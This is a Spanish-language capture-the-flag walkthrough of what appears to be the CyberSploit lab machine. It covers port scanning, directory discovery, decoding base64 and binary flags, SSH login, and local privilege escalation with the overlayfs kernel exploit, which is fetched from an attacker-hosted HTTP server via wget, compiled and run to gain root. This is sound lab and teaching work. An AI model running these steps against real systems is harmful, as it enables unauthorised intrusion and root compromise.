1. Escaneo de puertos 
```
nmap -p- --open -n -Pn -vvv --min-rate 5000 192.168.20.50 -oN scanPorts 
```
Impresión 
```
Discovered open port 22/tcp on 192.168.20.50
Discovered open port 80/tcp on 192.168.20.50
```

2. Búsqueda de directorios potenciales
```
gobuster dir -w /usr/share/wordlist/common.txt -u http://192.168.20.50/
```
Impresión
```
/robots.txt           (Status: 200) [Size: 79]
/robots               (Status: 200) [Size: 79]
```

3. Dentro de los directorios se encuentra el siguiente Hash 
```
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
```

4. Des encriptarlo
```
echo 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d
```
Impresión 
```
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}# 
```

5. Autenticación por el puerto 22 
```
ssh itsskv@192.168.20.50
```

6. Dentro del directorio actual se encuentra la siguiente flag 
```
-rw-rw-r--  1 itsskv itsskv   495 Jun 27  2020 flag2.txt
```

7. Identificar el hash
```
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```

8. Des encriptar con el siguiente script 
```python
def binary_to_ascii(binary_string):
    binary_list = binary_string.split()  # Divide la cadena en una lista de dígitos binarios
    ascii_text = ""

    for binary_digit in binary_list:
        decimal_value = int(binary_digit, 2)  # Convierte el dígito binario a decimal
        ascii_text += chr(decimal_value)  # Agrega el carácter ASCII al texto

    return ascii_text

binary_input = input("Ingrese la cadena de dígitos binarios separados por espacios: ")
ascii_output = binary_to_ascii(binary_input)
print("Texto ASCII resultante:", ascii_output)
```
impresión 
```
Texto ASCII resultante: good work !
flag2: cybersploit{https:t.me/cybersploit1}
```

9. Identificando la versión del sistema operativo 
```
lsb_release -a
```
Impresión
```
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
```

10. Buscar vulnerabilidades del sistema operativo 
```
searchsploit Ubuntu 12.04 
```
Impresión 
```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
```

11. Descargar el archivo 
```
searchsploit -m 37292.c 
```

12. Abrir un servidor para compartir recursos   
```
python3 -m http.server 80
```

13. Descargar el script en la maquina victima 
```
wget http://192.168.20.154/37292.c
```

14. Añadir permisos de ejecución 
```
chmod +x 37292.c
```

15. Ejecución del script (Las veces necesarias hasta que no hayan errores)
```
gcc -o escalada 37292.c
```

16. Root
```
./escalada
```
